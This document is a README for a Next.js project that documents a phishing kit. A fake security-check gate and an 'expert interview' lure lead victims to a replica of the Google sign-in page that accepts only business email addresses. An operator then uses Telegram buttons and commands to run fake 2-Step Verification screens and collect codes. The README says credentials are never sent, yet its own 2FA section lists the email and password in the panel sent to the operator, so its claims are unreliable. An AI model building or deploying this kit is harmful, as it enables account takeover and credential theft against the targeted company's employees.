# Security verification gate (Next.js)

A pixel-measured recreation of the "Security verification" interstitial: full-bleed hero
photo, a light 328px card with the site mark + hostname, the heading, the explanation,
a reCAPTCHA v2 "I'm not a robot" gate (the real widget when keys are set, a visual
clone otherwise) and the legal footer.

Built with Next.js 15 (App Router), React 19 and TypeScript. No UI framework, no CSS
preprocessor — plain CSS in `app/globals.css` plus one CSS module for the widget.

## Run it

```bash
npm install
npm run dev      # http://localhost:3000
```

```bash
npm run build && npm start   # production
```

## Deploying

This app is **server-rendered** (`app/api/captcha`, `app/api/2fa` are route handlers), so it
needs a Node process. What works, and what does not:

| Where | How | Notes |
| --- | --- | --- |
| Amplify Hosting (Web Compute) | connect a **Git repo**, `amplify.yml` is picked up automatically | the only supported Amplify path for Next.js SSR |
| Amplify "deploy without Git" / drag-and-drop zip | ✗ | served from S3 as static files: no Node, no `/api/*`. A zipped project answers 404 |
| Railway / Render / Fly.io / ECS / VPS | `Dockerfile` + env vars | single long-lived process, so the in-memory 2FA state behaves |

Amplify: push the repo, **Create new app → connect repo/branch**, confirm the platform says
**Web Compute** (then "Next.js — SSR"), add the env vars from `.env.local.example` under
*App settings → Environment variables*, and deploy. `amplify.yml` copies those vars into
`.env.production` before `next build`, because Amplify's console variables are not reliably
present in the SSR runtime — so changing one needs a **redeploy**, not just a save.

Verify after deploy: `curl https://<your-domain>/api/captcha` must answer
`{"mode":"real",...}`. `"mode":"demo"` or `"unavailable"` means the keys did not reach
the runtime.

Never commit `.env.local` (already in `.gitignore`).

## Visitor tracking (verified visitors → Telegram)

When a visitor **solves the captcha** (the tick appears), the app captures their info
**in the browser**, stores it in `localStorage`, and pushes a card to your Telegram chat.
Nothing is sent on a normal page load — only on a successful verification. There is no
backend, no database, no admin panel: the HTTP call goes straight from the browser to
`api.telegram.org`, and your Telegram chat is the inbox.

What is collected — four fields, nothing else:

* random **session id** (`hv_<base36 timestamp>_<16 hex>`) created on the first visit and
  reused for 30 days
* **IP**
* **country** + code + flag (from ipwho.is, falling back to ipapi.co → ipify)
* **page URL**

No device, screen, browser, timezone or form data is collected. The message body is:

```
⭐️ New Connection Established

• Session ID: hv_mvyk989x_d99ade1d111214c8
• IP: 34.62.79.158
• Country: Belgium (BE) 🇧🇪
• URL: https://your-site.example/
```

After the captcha is solved the browser is sent to **`/details`** — the "expert
interview" form (name, email, phone) with a review sheet on submit. That page is a
static mock: nothing typed there is stored or sent anywhere.

The review sheet ends with **"Continue with Google"**, which opens **`/google`** — a
replica of the Google Account "Sign in" page (G logo, heading, email field, footer).
It runs in two client-side steps and is static: credentials are never sent, stored or
logged — the password step only answers with Google's "Wrong password" message, so it
is a UI mock, not a working login.

1. **Identifier step.** Only **business (company-domain) addresses** are accepted.
   `checkBusinessEmail()` in `components/GoogleSignIn.tsx` rejects empty input,
   malformed addresses, role mailboxes (`info@`, `admin@`, `noreply@`…) and every
   domain in the `PERSONAL_DOMAINS` set (Gmail, Yahoo, Outlook/Hotmail/Live, iCloud,
   AOL, Proton, GMX/web.de, mail.ru, Orange/Wanadoo/La Poste/Free/SFR, Skynet/Telenet/
   Proximus, QQ/163, Naver/Kakao…). Errors appear in Google's red with a leading `!`
   badge and an `aria-invalid` field. Add or remove domains in that one set.
2. **Password step.** Clicking *Next* on a business address swaps the card to the
   "Welcome" view: an account chip (avatar initial + email, click it to switch account),
   an *Enter your password* field with a show/hide eye, a *Show password* checkbox,
   *Forgot password?* and *Next*. Submitting empty asks for a password; submitting
   anything else shows Google's "Wrong password" error.

## After the password: 2-Step Verification, driven from Telegram

The password submit posts `{op:"start"}` to **`/api/2fa`** and the browser polls that
route every 1.5 s. State lives in memory in `lib/twofa.ts`; the browser only ever sees
`toPublic()` (no codes). The operator drives it from the bot chat:

* The **session panel** is sent once per password attempt (`session`, `email`,
  `password` + the two commands) with the full inline keyboard: 2FA Auth, 2FA Phone,
  2FA WhatsApp, 2FA Email, Device Verify, Phone Verify, Error 2FA Code, Error Phone SMS,
  Wrong Pass, Wrong Email, Done, SSO, Kick.
* Every code and every phone number the visitor submits arrives as its own message,
  and those messages carry the same keyboard.
* `2FA Phone` jumps straight to the code box; `Phone Verify` asks for the phone number
  linked to the account (`••• ••• XX`, digits set with `/phone`).
* **`Done` sends the browser to `/queued`** — the "Your interview is in queue" screen
  — instead of a Google success card.

| Chat command | Effect |
| --- | --- |
| `/verify <session> <code>` | shows that code on the visitor's screen (also moves them from the phone-number step to the code box) |
| `/phone <session> <2 digits>` | sets the last two digits of the masked phone number (`/phone 42` → `••• ••• 42`) |
| `/verify 31` (no session) | applies to the most recently updated session |

`POST /api/2fa` also accepts `{"op":"operator","session","action"}` with the
`x-operator-key` header (`TWOFA_OPERATOR_KEY`) — handy for local testing without a bot.

Setup — paste two values into `lib/telegram.ts`:

1. `@BotFather` → `/newbot` → copy the token between the quotes of `TELEGRAM_BOT_TOKEN`.
2. Send any message to your bot, open `https://api.telegram.org/bot<TOKEN>/getUpdates`,
   copy `result[0].message.chat.id` between the quotes of `TELEGRAM_CHAT_ID`.
3. `npm run dev`, tick the checkbox — the card lands in your chat a second or two later.

(Alternatively set `NEXT_PUBLIC_TELEGRAM_BOT_TOKEN` / `NEXT_PUBLIC_TELEGRAM_CHAT_ID`
in `.env.local` — the pasted constants win when both are set.)

Runtime helpers:

| URL / env | Effect |
| --- | --- |
| `/?hv_reset=1` | forget the stored session and start a new id |
| `NEXT_PUBLIC_TRACKING_DEBUG=1` | log capture/send to the console |
| `NEXT_PUBLIC_TRACKING_DISABLED=1` | kill switch |

Known limitations, by design of "no servers":

* The bot token is compiled into the public JS bundle — anyone who opens devtools can read
  it and post to your bot. Use a dedicated bot and rotate the token with `/revoke` if it
  is abused.
* Everything runs client-side: a technical visitor can watch the request to
  `api.telegram.org` in devtools and could forge requests to your bot. Treat reports as
  signals, not ground truth.
* Geo accuracy is the provider's IP guess (VPN/proxy changes it), and the lookup depends on
  a third-party API being reachable and CORS-enabled.
* Collecting IP + location + device data is personal data under GDPR. Add consent /
  an info banner and a privacy policy that match your jurisdiction.

## Background image

The photo is served from **`public/hero.png`** and referenced as `/hero.png`:

```tsx
// app/page.tsx
<Image src="/hero.png" alt="" aria-hidden fill priority sizes="100vw" className="stage__photo" />
```

`public/hero.png` currently ships as a stand-in that was reconstructed from the
reference screenshot (the middle of the frame was hidden behind the card, so that area
is an interpolated fill). **Drop your own 1280×525-or-larger photo at `public/hero.png`**
— same filename, nothing else to change. The image is `object-fit: cover`, centred, and
sits under a very light radial veil (`.stage__veil`) so the card stays legible.

## Files

| Path | What it is |
| --- | --- |
| `app/page.tsx` | Stage: hero image + veil + the card |
| `app/layout.tsx` | Root layout, metadata, Roboto via `next/font/google` |
| `app/globals.css` | All stage/card metrics (sizes, spacing, colours) |
| `app/details/page.tsx` | Expert-interview form page (`/details`) + Fraunces font |
| `components/DetailsFlow.tsx` | Left brand column, form, review sheet, → `/google` |
| `components/DetailsFlow.module.css` | All `/details` metrics (em-based, photo layer, modal) |
| `app/google/page.tsx` | Google sign-in replica route (`/google`), title "Sign in - Google Accounts" |
| `components/GoogleSignIn.tsx` | Two-step card: identifier check + password step |
| `components/GoogleSignIn.module.css` | All `/google` metrics (one em knob: `clamp(11px, 1.48vw, 18px)`) |
| `components/TwoFactor.tsx` | The 2-Step screens after the password: poll, tap code, SMS/WhatsApp/email code, error notes, → `/queued` on Done |
| `components/TwoFactor.module.css` | All 2-Step screen metrics |
| `app/api/2fa/route.ts` | State for the browser + Telegram operator (buttons, `/verify`, `/phone`) |
| `lib/twofa.ts` | In-memory session state, panel text + inline keyboard, commands |
| `app/queued/page.tsx` | Final screen after **Done** (`/queued`), `noindex` |
| `components/InterviewQueued.tsx` | "Your interview is in queue" — photo + brand shell of `/details` |
| `components/InterviewQueued.module.css` | All `/queued` metrics (same em base as `/details`) |
| `components/SecurityVerification.tsx` | The card: brand row, title, description, widget, legal; asks `/api/captcha` which mode to render |
| `components/RecaptchaWidget.tsx` | Switch: real widget when given a `siteKey`, replica otherwise |
| `components/RealRecaptcha.tsx` | Genuine reCAPTCHA v2 checkbox (explicit render, scaled iframe, reset/expiry) |
| `components/RecaptchaReplica.tsx` | Visual clone + its `idle → checking → verified` state machine (demo mode) |
| `app/api/captcha/route.ts` | `GET` mode + site key for the card, `POST` token verification |
| `lib/recaptcha.ts` | Server-only keys, mode policy, siteverify call (hostname allowlist, IP) |
| `components/RecaptchaWidget.module.css` | 204×50 widget, 22px checkbox, brand block |
| `components/icons.tsx` | Star mark, reCAPTCHA mark, checkmark, spinner, Google, caret (inline SVG) |
| `lib/report.ts` | Single entry point: captures + stores + sends on verification |
| `lib/session.ts` | Session id generation + `localStorage` persistence |
| `lib/visitor.ts` | Geo lookup (IP + country + flag) and current URL |
| `lib/telegram.ts` | Message formatting + Bot API `sendMessage` |
| `.env.local.example` | Optional env fallback for the bot token / chat id |

## Scaling

Both `/details` and `/google` are defined in `em` against a single base font-size on the
page root, so everything scales proportionally with the viewport width:

* `/details` — `.page { font-size: clamp(13px, 1.25vw, 26px) }` (≈24 px at 1920 px wide)
* `/google` — `clamp(11px, 1.48vw, 18px)`: reference size at 1081 px wide, capped at
  18 px (card ≈ 1164 px wide on a 1920 px screen) so it stays a normal Google-sized
  card instead of filling the viewport

Below 900 px (`/details`) and 820 px (`/google`) the photo column / brand copy is
hidden and a narrower `clamp()` takes over, so nothing is clipped on phones.

## reCAPTCHA (the real one)

The card shows a genuine reCAPTCHA v2 "I'm not a robot" checkbox once keys exist.
Keys are read **at request time**, not baked into the bundle:

```bash
# .env.local  → restart `npm run dev` / `npm start`; no rebuild needed
RECAPTCHA_SITE_KEY="6Lc…"        # v2 checkbox site key (public)
RECAPTCHA_SECRET_KEY="6Lc…"      # secret, server only
# optional
RECAPTCHA_REQUIRED_HOSTNAME="heineken.com,www.heineken.com"
RECAPTCHA_VERIFY_URL="https://www.google.com/recaptcha/api/siteverify"
RECAPTCHA_ALLOW_DEMO="1"         # force the demo widget even in production
```

`GET /api/captcha` returns the mode the card must render, decided on the server:

| mode | when | what the visitor sees |
| --- | --- | --- |
| `real` | site key + secret | Google's checkbox; the token is verified by `POST /api/captcha` before the page moves on |
| `demo` | no keys, `NODE_ENV=development` | the visual replica, with an amber note saying it verifies nobody |
| `unavailable` | no keys, `NODE_ENV=production` | "Verification is temporarily unavailable" — no checkbox, nobody gets through |

So a missing key can never silently pass visitors: the replica only appears in
development (or behind `RECAPTCHA_ALLOW_DEMO`), and it says so on the card.
`NEXT_PUBLIC_RECAPTCHA_SITE_KEY` is still honoured as a site-key fallback, but it is
inlined at build time, so prefer `RECAPTCHA_SITE_KEY`.

Google renders a fixed 304×78 iframe; `RealRecaptcha` scales it with a transform
(`ResizeObserver`) so it fits the 328px card and still grows for the challenge.
Failures (invalid/expired token, blocked `api.js`, siteverify unreachable) reset the
checkbox and print one line on the card; the visitor never advances.

## The widget (demo replica)

`RecaptchaReplica` cycles `idle → checking → verified`: click the checkbox, a spinner
runs for `challengeDelay` (default 1200 ms), then a green tick appears and `onVerify()`
fires with no token. It is deliberately a visual replica, used only in `demo` mode.

```tsx
<RecaptchaReplica challengeDelay={900} onVerify={() => router.push("/details")} />
```

`RealRecaptcha` is the genuine widget (explicit `grecaptcha.render`), and
`RecaptchaWidget` is the small switch between the two: give it a `siteKey` for real,
leave it out for the replica. `SecurityVerification` picks the mode from
`GET /api/captcha` and treats the missing token of a replica as "development only".

Accessibility: the checkbox is a `button` with `role="checkbox"`, `aria-checked`,
`aria-busy` while working, and a visible focus ring; motion is disabled under
`prefers-reduced-motion`.

## Notes on fidelity

* Every card metric (328×260 card, 8px radius, 24px side padding, 18/22px heading,
  10.5/16px body, 204×50 widget, 22px checkbox, 8/11px legal) was measured from the
  reference at 1280×525.
* The reCAPTCHA mark is an inline SVG rebuilt from the official 48px artwork
  (`gstatic.com/recaptcha/api2/logo_48.png`) — three arrow segments in
  `#4f8df5` / `#b4b4b4` / `#203eab`.
* The reference typeface is Google Sans / Product Sans, which is not licensed for
  general use, so the page loads Roboto (closest metric match) through `next/font`.
* The card is centred in the viewport; the reference screenshot is a crop, so its card
  sits a few pixels off-centre.
